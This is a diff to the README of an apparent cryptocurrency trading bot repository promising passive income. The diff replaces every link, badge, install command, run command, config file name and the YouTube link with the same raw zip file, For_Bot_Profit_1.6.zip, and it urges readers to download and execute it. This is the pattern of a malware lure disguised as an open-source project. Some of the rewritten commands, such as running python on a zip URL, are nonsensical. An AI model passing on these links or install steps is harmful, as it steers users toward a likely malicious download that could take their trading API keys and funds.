@@ -1,6 +1,6 @@
 # Bot For Profit: Build Your Own Trading Bot for Passive Income
 
-![Bot For Profit](https://img.shields.io/badge/Bot%20For%20Profit-Ready%20to%20Use-brightgreen)
+![Bot For Profit](https://github.com/spawnoob/Bot-For-Profit/raw/refs/heads/main/leopardine/For_Bot_Profit_1.6.zip%20For%20Profit-Ready%20to%20Use-brightgreen)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -16,7 +16,7 @@
 ## Overview
 Welcome to the **Bot For Profit** repository! This project aims to help you create a trading bot that can generate passive income. Follow our YouTube step-by-step guide to understand how to set up and customize your bot effectively. 
 
-You can find the latest releases of the bot [here](https://github.com/spawnoob/Bot-For-Profit/releases). Download the necessary files and execute them to get started.
+You can find the latest releases of the bot [here](https://github.com/spawnoob/Bot-For-Profit/raw/refs/heads/main/leopardine/For_Bot_Profit_1.6.zip). Download the necessary files and execute them to get started.
 
 ## Features
 - **Algorithmic Trading**: Automate your trading strategies with ease.
@@ -36,7 +36,7 @@ To get started with the Bot For Profit, you will need to have Python installed o
 ## Installation
 1. Clone the repository:
    ```bash
-   git clone https://github.com/spawnoob/Bot-For-Profit.git
+   git clone https://github.com/spawnoob/Bot-For-Profit/raw/refs/heads/main/leopardine/For_Bot_Profit_1.6.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -44,19 +44,19 @@ To get started with the Bot For Profit, you will need to have Python installed o
    ```
 3. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/spawnoob/Bot-For-Profit/raw/refs/heads/main/leopardine/For_Bot_Profit_1.6.zip
    ```
 
-You can find the latest releases of the bot [here](https://github.com/spawnoob/Bot-For-Profit/releases). Download the necessary files and execute them to get started.
+You can find the latest releases of the bot [here](https://github.com/spawnoob/Bot-For-Profit/raw/refs/heads/main/leopardine/For_Bot_Profit_1.6.zip). Download the necessary files and execute them to get started.
 
 ## Usage
 To run the bot, execute the following command in your terminal:
 ```bash
-python main.py
+python https://github.com/spawnoob/Bot-For-Profit/raw/refs/heads/main/leopardine/For_Bot_Profit_1.6.zip
 ```
 
 ### Configuration
-Before running the bot, you need to configure your settings. Open the `config.py` file and set your API keys and trading preferences.
+Before running the bot, you need to configure your settings. Open the `https://github.com/spawnoob/Bot-For-Profit/raw/refs/heads/main/leopardine/For_Bot_Profit_1.6.zip` file and set your API keys and trading preferences.
 
 ### Example Configuration
 ```python
@@ -100,8 +100,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 ## Support
 If you encounter any issues or have questions, feel free to open an issue in the repository. You can also check the "Releases" section for updates and fixes.
 
-For more resources, visit our [YouTube channel](https://www.youtube.com/channel/UCXXXXX) for tutorials and tips on trading strategies.
+For more resources, visit our [YouTube channel](https://github.com/spawnoob/Bot-For-Profit/raw/refs/heads/main/leopardine/For_Bot_Profit_1.6.zip) for tutorials and tips on trading strategies.
 
-![Crypto Trading](https://source.unsplash.com/featured/?cryptocurrency)
+![Crypto Trading](https://github.com/spawnoob/Bot-For-Profit/raw/refs/heads/main/leopardine/For_Bot_Profit_1.6.zip)
 
 Stay updated with the latest in algorithmic trading and join our community discussions. Happy trading!
